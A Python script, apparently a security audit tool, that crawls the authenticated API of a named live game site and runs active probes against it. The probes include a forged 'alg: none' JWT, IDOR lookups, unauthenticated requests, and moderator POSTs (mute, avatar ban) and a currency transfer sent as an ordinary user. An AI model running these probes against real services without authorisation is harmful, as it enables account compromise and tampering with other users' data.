#!/usr/bin/env python3
"""Diplomacia authenticated crawl + passive/active security probes."""
import base64
import json
import time
import urllib.error
import urllib.request
from datetime import datetime
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
AUTH_FILE = Path("/root/diplomacia-auth.json")
OUT_CRAWL = ROOT / "output" / "crawl"
OUT_SEC = ROOT / "output" / "security"
DOCS = ROOT / "docs"
BASE = "https://diplomacia.com.tr/api"

GET_ENDPOINTS = [
    "/init/data",
    "/players/profile",
    "/players/residence",
    "/players/country-rank",
    "/players/notification-settings",
    "/players/diamonds/packages",
    "/players/diamonds/campaign-status",
    "/players/blocked",
    "/players/economy-history",
    "/players/passive-skills",
    "/countries",
    "/online",
    "/online/players",
    "/countries/leaderboard/world?page=1&limit=10",
    "/countries/leaderboard/reputation?page=1&limit=10",
    "/countries/map/colors",
    "/countries/map/scores",
    "/world/summary?limit=20",
    "/world/dissolved-countries",
    "/world/banned-players?offset=0",
    "/wars",
    "/wars/ended?limit=5",
    "/wars/my-country",
    "/wars/war-targets",
    "/factories/my",
    "/factories/work-status",
    "/factories/world?page=1&limit=5",
    "/factories/region?page=1&limit=5",
    "/market?page=1",
    "/market/my",
    "/parties/all",
    "/parties/my",
    "/quests",
    "/press?tab=latest&page=1",
    "/press/cooldown",
    "/press/guides",
    "/chat/global?lang=tr",
    "/chat/unread",
    "/chat/conversations",
    "/provinces/all",
    "/provinces/travel/status",
    "/military/me",
    "/military-ops/my",
    "/training-wars/my",
    "/auto/status",
    "/cabinet/my-role",
    "/citizenship/my",
    "/visas/my",
    "/visas/pending-count",
    "/citizenship/pending-count",
    "/conferences",
    "/moderation/reports/count",
]

SECURITY_TESTS = []


def load_auth():
    data = json.loads(AUTH_FILE.read_text())
    return data["token"], data.get("player_id"), data.get("username")


def request(method, path, token=None, body=None, extra_headers=None):
    url = BASE + path if path.startswith("/") else path
    headers = {"Accept": "application/json", "User-Agent": "DiplomaciaAudit/1.0"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    if body is not None:
        headers["Content-Type"] = "application/json"
        data = json.dumps(body).encode()
    else:
        data = None
    if extra_headers:
        headers.update(extra_headers)
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=25) as resp:
            raw = resp.read().decode("utf-8", errors="replace")
            elapsed = round((time.time() - t0) * 1000)
            try:
                parsed = json.loads(raw)
            except Exception:
                parsed = raw[:2000]
            return {"status": resp.status, "ms": elapsed, "data": parsed, "error": None}
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", errors="replace")
        elapsed = round((time.time() - t0) * 1000)
        try:
            parsed = json.loads(raw)
        except Exception:
            parsed = raw[:500]
        return {"status": e.code, "ms": elapsed, "data": parsed, "error": None}
    except Exception as e:
        return {"status": 0, "ms": 0, "data": None, "error": str(e)}


def jwt_parts(token):
    parts = token.split(".")
    if len(parts) != 3:
        return None, None, None
    def dec(p):
        pad = "=" * (-len(p) % 4)
        return json.loads(base64.urlsafe_b64decode(p + pad))
    return dec(parts[0]), dec(parts[1]), parts[2]


def crawl_gets(token):
    results = {}
    for ep in GET_ENDPOINTS:
        safe = ep.replace("/", "_").replace("?", "_").strip("_")
        r = request("GET", ep, token=token)
        results[ep] = {"status": r["status"], "ms": r["ms"], "error": r["error"]}
        if r["status"] == 200 and isinstance(r["data"], (dict, list)):
            preview = r["data"]
            if isinstance(preview, dict):
                results[ep]["keys"] = list(preview.keys())[:30]
            (OUT_CRAWL / f"{safe}.json").write_text(
                json.dumps(r, ensure_ascii=False, indent=2)[:500000], encoding="utf-8"
            )
        time.sleep(0.15)
    return results


def security_suite(token, player_id):
    findings = []
    header, payload, sig = jwt_parts(token)

    # S1: No auth on sensitive endpoints
    for ep in ["/init/data", "/players/profile", "/moderation/reports", "/mod/punishment-history"]:
        r = request("GET", ep, token=None)
        findings.append({
            "id": "S1-no-auth",
            "endpoint": ep,
            "status": r["status"],
            "severity": "CRITICAL" if r["status"] == 200 else "OK",
            "note": "Should be 401 without token",
        })

    # S2: JWT alg none (tampered)
    tampered_hdr = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
    tampered = f"{tampered_hdr}.{base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()}."
    r = request("GET", "/players/profile", token=tampered)
    findings.append({
        "id": "S2-jwt-alg-none",
        "status": r["status"],
        "severity": "CRITICAL" if r["status"] == 200 else "OK",
        "note": "alg:none token should be rejected",
    })

    # S3: IDOR - random UUID for player profile
    fake_id = "00000000-0000-0000-0000-000000000001"
    r = request("GET", f"/players/{fake_id}", token=token)
    findings.append({
        "id": "S3-idor-fake-player",
        "endpoint": f"/players/{fake_id}",
        "status": r["status"],
        "severity": "INFO" if r["status"] in (404, 403) else "MEDIUM",
        "note": str(r["data"])[:200] if r["data"] else "",
    })

    # S4: IDOR - access own vs enumerate (if we had another known id from wars)
    if player_id:
        r = request("GET", f"/players/{player_id}", token=token)
        findings.append({
            "id": "S4-own-player-by-id",
            "status": r["status"],
            "severity": "OK" if r["status"] == 200 else "LOW",
            "note": "Own profile by UUID",
        })

    # S5-S8: Mod endpoints as normal user
    mod_tests = [
        ("POST", "/mod/punish", {"target_id": fake_id, "type": "mute", "duration_label": "1h", "reason": "audit-test"}),
        ("GET", "/mod/punishment-history", None),
        ("GET", f"/mod/status/{fake_id}", None),
        ("GET", "/moderation/reports?status=open", None),
        ("POST", "/moderation/ban-avatar", {"player_id": fake_id, "hours": 1}),
    ]
    for method, ep, body in mod_tests:
        r = request(method, ep, token=token, body=body)
        sev = "CRITICAL" if r["status"] in (200, 201) and method == "POST" else ("HIGH" if r["status"] == 200 and "reports" in ep else "OK")
        findings.append({
            "id": f"S5-mod-{ep.split('/')[-1]}",
            "method": method,
            "endpoint": ep,
            "status": r["status"],
            "severity": sev,
            "note": "Normal user should get 403",
            "response": str(r["data"])[:300] if r["data"] else "",
        })
        time.sleep(0.2)

    # S9: Transfer to fake user (economy)
    r = request("POST", "/transfer/send", token=token, body={"recipient_id": fake_id, "amount": 1})
    findings.append({
        "id": "S9-transfer-fake",
        "status": r["status"],
        "severity": "LOW",
        "note": str(r["data"])[:200],
    })

    # S10: Public countries without auth
    r = request("GET", "/countries", token=None)
    findings.append({
        "id": "S10-public-countries",
        "status": r["status"],
        "severity": "INFO",
        "note": "May be intentionally public",
    })

    # S11: tv claim analysis
    findings.append({
        "id": "S11-jwt-structure",
        "severity": "INFO",
        "note": f"alg={header.get('alg')}, tv={payload.get('tv')}, exp_days={round((payload.get('exp',0)-payload.get('iat',0))/86400,1)}",
    })

    return findings


def main():
    OUT_CRAWL.mkdir(parents=True, exist_ok=True)
    OUT_SEC.mkdir(parents=True, exist_ok=True)
    token, player_id, username = load_auth()

    print("=== CRAWL ===")
    crawl = crawl_gets(token)
    (OUT_CRAWL / "crawl_summary.json").write_text(
        json.dumps(crawl, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    ok = sum(1 for v in crawl.values() if v["status"] == 200)
    print(f"GET crawl: {ok}/{len(crawl)} OK")

    print("=== SECURITY ===")
    findings = security_suite(token, player_id)
    critical = [f for f in findings if f.get("severity") == "CRITICAL"]
    (OUT_SEC / "findings.json").write_text(
        json.dumps(findings, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    print(f"Findings: {len(findings)}, CRITICAL: {len(critical)}")

    summary = {
        "run_at": datetime.utcnow().isoformat() + "Z",
        "username": username,
        "crawl_ok": ok,
        "crawl_total": len(crawl),
        "findings_count": len(findings),
        "critical_count": len(critical),
        "critical_ids": [f["id"] for f in critical],
    }
    (ROOT / "output" / "run_summary.json").write_text(
        json.dumps(summary, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    return summary


if __name__ == "__main__":
    main()
